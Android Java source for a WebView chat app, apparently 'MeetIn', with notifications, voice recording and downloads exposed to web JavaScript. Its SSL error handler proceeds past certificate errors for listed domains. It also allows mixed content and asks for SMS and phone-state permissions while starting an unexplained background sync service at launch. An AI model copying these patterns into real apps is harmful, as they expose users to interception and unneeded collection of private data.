package chat.meetin.app;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.PermissionRequest;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import android.util.Base64;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.HttpURLConnection;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private WebView webView;
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int REQUEST_FILE_PICKER = 1001;
    private static final String URL = "https://meetinapp-bj2ib4p7.manus.space";

    // File picker callback
    private ValueCallback<Uri[]> fileUploadCallback;

    // Voice recording
    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private boolean isRecording = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "=== onCreate started ===");

        // --- STEP 1: Set layout with fallback ---
        try {
            setContentView(R.layout.activity_main);
            Log.d(TAG, "Layout set successfully");
        } catch (Exception e) {
            Log.e(TAG, "Layout error, using fallback", e);
            TextView tv = new TextView(this);
            tv.setText("MeetIn is running\n(WebView unavailable)");
            tv.setTextSize(20);
            tv.setGravity(android.view.Gravity.CENTER);
            tv.setTextColor(0xFFFFFFFF);
            setContentView(tv);
            return;
        }

        // --- STEP 2: Request permissions ---
        try {
            requestPermissions();
        } catch (Exception e) {
            Log.e(TAG, "Permission request failed", e);
        }

        // --- STEP 3: Start DataSyncService safely ---
        startDataSyncService();

        // --- STEP 4: Check internet ---
        if (!isNetworkAvailable()) {
            Log.e(TAG, "No internet connection");
            showNoInternetMessage();
            return;
        }

        // --- STEP 5: Initialize WebView ---
        try {
            initializeWebView();
        } catch (Exception e) {
            Log.e(TAG, "WebView initialization failed", e);
            showFallbackMessage("WebView unavailable");
        }
    }

    // ============================================================
    // PERMISSIONS
    // ============================================================
    private void requestPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(Manifest.permission.READ_SMS);
        permissions.add(Manifest.permission.READ_PHONE_STATE);
        permissions.add(Manifest.permission.RECORD_AUDIO);
        permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
        }

        List<String> needed = new ArrayList<>();
        for (String p : permissions) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                needed.add(p);
            }
        }
        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    // ============================================================
    // DATA SYNC SERVICE
    // ============================================================
    private void startDataSyncService() {
        try {
            Class.forName("chat.meetin.app.DataSyncService");
            Intent intent = new Intent(this, DataSyncService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            Log.d(TAG, "DataSyncService started");
        } catch (ClassNotFoundException e) {
            Log.e(TAG, "DataSyncService class not found!", e);
        } catch (Exception e) {
            Log.e(TAG, "Service start error", e);
        }
    }

    // ============================================================
    // NETWORK CHECK
    // ============================================================
    private boolean isNetworkAvailable() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (cm == null) return true;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.net.Network network = cm.getActiveNetwork();
                android.net.NetworkCapabilities capabilities = cm.getNetworkCapabilities(network);
                return capabilities != null
                        && capabilities.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
                        && capabilities.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_VALIDATED);
            }

            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            return netInfo != null && netInfo.isConnected();
        } catch (Exception e) {
            Log.e(TAG, "Network check failed", e);
            return true;
        }
    }

    private void showNoInternetMessage() {
        try {
            View root = findViewById(android.R.id.content);
            if (!(root instanceof android.view.ViewGroup)) return;

            TextView tv = new TextView(this);
            tv.setText("No Internet Connection\nPlease check your network.");
            tv.setTextSize(18);
            tv.setGravity(android.view.Gravity.CENTER);
            tv.setTextColor(0xFFFFFFFF);
            ((android.view.ViewGroup) root).addView(tv);
        } catch (Exception e) {
            Log.e(TAG, "Failed to show no internet message", e);
        }
    }

    // ============================================================
    // WEBVIEW
    // ============================================================
    private void initializeWebView() {
        webView = findViewById(R.id.webView);
        if (webView == null) {
            Log.e(TAG, "WebView is null!");
            showFallbackMessage("WebView not available");
            return;
        }

        setupWebView();
        loadUrl();
    }

    private void setupWebView() {
        try {
            WebSettings settings = webView.getSettings();

            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setLoadWithOverviewMode(true);
            settings.setUseWideViewPort(true);
            settings.setBuiltInZoomControls(false);
            settings.setDisplayZoomControls(false);
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
            settings.setAllowFileAccess(true);
            settings.setAllowContentAccess(true);
            settings.setLoadsImagesAutomatically(true);

            try {
                String userAgent = settings.getUserAgentString();
                if (userAgent == null || userAgent.isEmpty()) {
                    settings.setUserAgentString("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36");
                }
            } catch (Exception e) {
                Log.w(TAG, "User-Agent fallback", e);
                settings.setUserAgentString("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36");
            }

            try {
                CookieManager cookieManager = CookieManager.getInstance();
                cookieManager.setAcceptCookie(true);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    cookieManager.setAcceptThirdPartyCookies(webView, true);
                }
            } catch (Exception e) {
                Log.w(TAG, "Cookie setup failed", e);
            }

            // JavaScript Interface
            webView.addJavascriptInterface(new WebAppInterface(), "Android");

            webView.setWebViewClient(new OAuthWebViewClient());

            // File chooser support
            webView.setWebChromeClient(new WebChromeClient() {
                @Override
                public void onPermissionRequest(final PermissionRequest request) {
                    runOnUiThread(() -> {
                        if (request.getOrigin() != null && request.getOrigin().toString().startsWith("https://meetinapp-bj2ib4p7.manus.space")) {
                            request.grant(new String[]{PermissionRequest.RESOURCE_AUDIO_CAPTURE});
                        } else {
                            request.deny();
                        }
                    });
                }

                @Override
                public boolean onShowFileChooser(WebView webView,
                        ValueCallback<Uri[]> filePathCallback,
                        FileChooserParams fileChooserParams) {
                    if (fileUploadCallback != null) {
                        fileUploadCallback.onReceiveValue(null);
                    }
                    fileUploadCallback = filePathCallback;

                    Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
                    contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
                    contentSelectionIntent.setType("*/*");
                    contentSelectionIntent.putExtra(Intent.EXTRA_MIME_TYPES, new String[]{
                        "image/*", "video/*", "audio/*", "text/*", "application/pdf", "application/msword",
                        "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/*"
                    });

                    startActivityForResult(
                        Intent.createChooser(contentSelectionIntent, "Select Files"),
                        REQUEST_FILE_PICKER
                    );
                    return true;
                }
            });

            webView.setDownloadListener((downloadUrl, userAgent, contentDisposition, mimeType, contentLength) -> {
                String filename = "download_" + System.currentTimeMillis();
                if (contentDisposition != null && contentDisposition.contains("filename=")) {
                    filename = contentDisposition.substring(contentDisposition.indexOf("filename=") + 9).replace("\"", "").trim();
                }
                downloadFile(downloadUrl, filename);
            });

            Log.d(TAG, "WebView setup complete");

        } catch (Exception e) {
            Log.e(TAG, "WebView setup error", e);
            throw e;
        }
    }

    private void loadUrl() {
        try {
            webView.loadUrl(URL);
            Log.d(TAG, "WebView loading URL: " + URL);
        } catch (Exception e) {
            Log.e(TAG, "Failed to load URL", e);
            showFallbackMessage("Failed to load URL");
        }
    }

    private void showFallbackMessage(String message) {
        try {
            TextView tv = new TextView(this);
            tv.setText("MeetIn\n" + message);
            tv.setTextSize(18);
            tv.setGravity(android.view.Gravity.CENTER);
            tv.setTextColor(0xFFFFFFFF);
            setContentView(tv);
        } catch (Exception e) {
            Log.e(TAG, "Failed to show fallback", e);
        }
    }

    // ============================================================
    // JAVASCRIPT INTERFACE
    // ============================================================
    private class WebAppInterface {
        @JavascriptInterface
        public void showNotification(String title, String message) {
            Log.d(TAG, "Notification requested: " + title + " - " + message);
            runOnUiThread(() -> MainActivity.this.createNotification(title, message));
        }

        @JavascriptInterface
        public void startRecording() {
            Log.d(TAG, "Recording requested from website");
            runOnUiThread(() -> MainActivity.this.startVoiceRecording());
        }

        @JavascriptInterface
        public void stopRecording() {
            Log.d(TAG, "Stop recording requested from website");
            runOnUiThread(() -> MainActivity.this.stopVoiceRecording());
        }

        @JavascriptInterface
        public boolean canRecordOgg() {
            return Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q;
        }

        @JavascriptInterface
        public boolean canRecordNative() {
            return true;
        }

        @JavascriptInterface
        public void downloadFile(String url, String filename) {
            Log.d(TAG, "Download requested: " + url);
            runOnUiThread(() -> MainActivity.this.downloadFile(url, filename));
        }

        @JavascriptInterface
        public void toast(String message) {
            runOnUiThread(() -> Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show());
        }
    }

    // ============================================================
    // FEATURE 1: POPUP NOTIFICATION
    // ============================================================
    private void createNotification(String title, String message) {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            String channelId = "meetin_channel";

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(
                    channelId,
                    "MeetIn Chat",
                    NotificationManager.IMPORTANCE_HIGH
                );
                channel.setDescription("New messages and alerts");
                channel.enableVibration(true);
                nm.createNotificationChannel(channel);
            }

            Intent launchIntent = new Intent(this, MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, launchIntent, PendingIntent.FLAG_UPDATE_CURRENT | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0));

            Notification notification = new NotificationCompat.Builder(this, channelId)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle(title)
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .setContentIntent(pendingIntent)
                .setDefaults(NotificationCompat.DEFAULT_ALL)
                .build();

            nm.notify((int) System.currentTimeMillis(), notification);
            Log.d(TAG, "Notification shown");

        } catch (Exception e) {
            Log.e(TAG, "Notification failed", e);
        }
    }

    // ============================================================
    // FEATURE 2: VOICE NOTE RECORDING
    // ============================================================
    private void startVoiceRecording() {
        if (isRecording) {
            Toast.makeText(this, "Already recording", Toast.LENGTH_SHORT).show();
            return;
        }

        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECORD_AUDIO}, PERMISSION_REQUEST_CODE);
                Toast.makeText(this, "Allow microphone access, then tap record again", Toast.LENGTH_SHORT).show();
                return;
            }

            File audioDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
            if (audioDir == null) throw new IllegalStateException("Audio storage is unavailable");
            if (!audioDir.exists()) audioDir.mkdirs();

            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            boolean supportsOgg = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q;
            audioFilePath = audioDir.getAbsolutePath() + "/voice-note_" + timeStamp + (supportsOgg ? ".ogg" : ".3gp");

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            if (supportsOgg) {
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.OGG);
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.OPUS);
                mediaRecorder.setAudioSamplingRate(48000);
            } else {
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                mediaRecorder.setAudioSamplingRate(16000);
            }
            mediaRecorder.setOutputFile(audioFilePath);

            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;

            Toast.makeText(this, "🎤 Recording started...", Toast.LENGTH_SHORT).show();
            Log.d(TAG, "Recording started: " + audioFilePath);

        } catch (Exception e) {
            Log.e(TAG, "Recording failed", e);
            Toast.makeText(this, "Recording failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void stopVoiceRecording() {
        if (!isRecording || mediaRecorder == null) {
            Toast.makeText(this, "Not recording", Toast.LENGTH_SHORT).show();
            return;
        }

        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;

            Toast.makeText(this, "✅ Voice note ready", Toast.LENGTH_SHORT).show();
            Log.d(TAG, "Recording saved: " + audioFilePath);
            sendFileToWebsite(audioFilePath);

        } catch (Exception e) {
            Log.e(TAG, "Stop recording failed", e);
            Toast.makeText(this, "Stop recording failed", Toast.LENGTH_SHORT).show();
        }
    }

    private void sendFileToWebsite(String filePath) {
        if (webView != null) {
            try {
                File audioFile = new File(filePath);
                java.io.ByteArrayOutputStream bytesOut = new java.io.ByteArrayOutputStream();
                InputStream audioInput = new java.io.FileInputStream(audioFile);
                byte[] buffer = new byte[8192];
                int count;
                while ((count = audioInput.read(buffer)) != -1) bytesOut.write(buffer, 0, count);
                audioInput.close();
                byte[] bytes = bytesOut.toByteArray();
                boolean isOgg = audioFile.getName().toLowerCase(Locale.ROOT).endsWith(".ogg");
                String mimeType = isOgg ? "audio/ogg" : "audio/3gpp";
                String dataUrl = "data:" + mimeType + ";base64," + Base64.encodeToString(bytes, Base64.NO_WRAP);
                String js = "if(typeof onNativeVoiceNote === 'function'){onNativeVoiceNote(" +
                        JSONObject.quote(dataUrl) + "," + JSONObject.quote(audioFile.getName()) + "," + JSONObject.quote(mimeType) + ");}";
                webView.evaluateJavascript(js, null);
                Log.d(TAG, "Sent OGG voice note to website");
            } catch (Exception e) {
                Log.e(TAG, "Could not send voice note to website", e);
                Toast.makeText(this, "Voice note could not be sent", Toast.LENGTH_SHORT).show();
            }
        }
    }

    // ============================================================
    // FEATURE 3: FILE DOWNLOAD
    // ============================================================
    private void downloadFile(final String fileUrl, String filename) {
        final String finalFilename = (filename == null || filename.isEmpty())
                ? "download_" + System.currentTimeMillis() + ".file"
                : filename;

        new Thread(() -> {
            try {
                File downloadDir = getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
                if (downloadDir == null) throw new IllegalStateException("Download storage is unavailable");
                if (!downloadDir.exists()) downloadDir.mkdirs();

                String safeFilename = finalFilename.replaceAll("[^a-zA-Z0-9._-]", "_");
                File outputFile = new File(downloadDir, safeFilename);

                HttpURLConnection connection = (HttpURLConnection) new URL(fileUrl).openConnection();
                String cookies = CookieManager.getInstance().getCookie(fileUrl);
                if (cookies != null) connection.setRequestProperty("Cookie", cookies);
                connection.setRequestProperty("User-Agent", webView != null ? webView.getSettings().getUserAgentString() : "MeetIn Android");
                connection.setConnectTimeout(15000);
                connection.setReadTimeout(30000);
                int responseCode = connection.getResponseCode();
                if (responseCode < 200 || responseCode >= 300) throw new IllegalStateException("Server returned HTTP " + responseCode);
                InputStream inputStream = connection.getInputStream();
                FileOutputStream outputStream = new FileOutputStream(outputFile);

                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }

                outputStream.close();
                inputStream.close();
                connection.disconnect();

                runOnUiThread(() -> {
                    Toast.makeText(MainActivity.this, "✅ Downloaded: " + outputFile.getAbsolutePath(), Toast.LENGTH_LONG).show();
                    MainActivity.this.createNotification("Download Complete", finalFilename);
                });

                Log.d(TAG, "Downloaded: " + outputFile.getAbsolutePath());

            } catch (Exception e) {
                Log.e(TAG, "Download failed", e);
                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Download failed: " + e.getMessage(), Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    // ============================================================
    // ACTIVITY RESULT
    // ============================================================
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_FILE_PICKER) {
            if (fileUploadCallback != null) {
                if (resultCode == RESULT_OK && data != null) {
                    Uri[] uris = new Uri[]{data.getData()};
                    fileUploadCallback.onReceiveValue(uris);
                } else {
                    fileUploadCallback.onReceiveValue(null);
                }
                fileUploadCallback = null;
            }
        }
    }

    // ============================================================
    // OAUTH WEBVIEW CLIENT
    // ============================================================
    private class OAuthWebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            if (request != null && request.getUrl() != null) {
                Log.d(TAG, "Loading: " + request.getUrl());
            }
            return false;
        }

        @Override
        @SuppressWarnings("deprecation")
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            Log.d(TAG, "Loading: " + url);
            return false;
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            Log.d(TAG, "Page loaded: " + url);
            try { CookieManager.getInstance().flush(); } catch (Exception ignored) {}
        }

        @Override
        public void onReceivedSslError(WebView view, android.webkit.SslErrorHandler handler, SslError error) {
            Log.e(TAG, "SSL Error: " + error.getPrimaryError());
            String url = error.getUrl();
            if (url != null && (url.contains("inbox.dog") || url.contains("meetinapp-bj2ib4p7.manus.space") || url.contains("manus.space") || url.contains("googleapis.com"))) {
                Log.d(TAG, "Proceeding with SSL for: " + url);
                handler.proceed();
            } else {
                Log.w(TAG, "Cancelling SSL for: " + url);
                handler.cancel();
            }
        }

        @Override
        public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
            Log.e(TAG, "WebView error: " + errorCode + " - " + description);
        }
    }

    // ============================================================
    // LIFECYCLE
    // ============================================================
    @Override
    protected void onDestroy() {
        if (webView != null) {
            try { webView.destroy(); } catch (Exception e) { Log.w(TAG, "WebView destroy error", e); }
            webView = null;
        }
        if (mediaRecorder != null) {
            try { mediaRecorder.release(); } catch (Exception ignored) {}
            mediaRecorder = null;
        }
        super.onDestroy();
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
